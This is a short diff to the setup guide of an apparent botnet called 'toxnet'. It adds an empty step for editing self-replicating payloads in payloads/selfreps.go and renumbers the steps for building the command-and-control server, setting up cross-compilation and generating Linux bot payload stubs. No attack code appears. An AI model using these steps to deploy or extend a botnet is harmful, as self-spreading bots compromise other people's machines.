@@ -355,12 +355,17 @@ Adjust package manager commands accordingly (yum, dnf, pacman, etc.).
      var Admins = []string{"YOUR QTOX ID HERE"}
    ```
 
-3. **Build the C2 server:**
+3. **Edit your bins in payloads/selfreps.go :**
+   ```bash
+     
+   ```
+
+4. **Build the C2 server:**
    ```bash
    go build -o toxnet-c2 main.go
    ```
 
-4. **Set up cross-compilation libraries:**
+5. **Set up cross-compilation libraries:**
    ```bash
    # Run the cross-compilation setup script
    ./xcompile_libs.sh
@@ -370,7 +375,7 @@ Adjust package manager commands accordingly (yum, dnf, pacman, etc.).
    ```
 
 
-5. **Generate bot payloads:**
+6. **Generate bot payloads:**
    ```bash
    # Generate Linux payload stub
    ./toxnet-c2 -t linux -o bot_stub
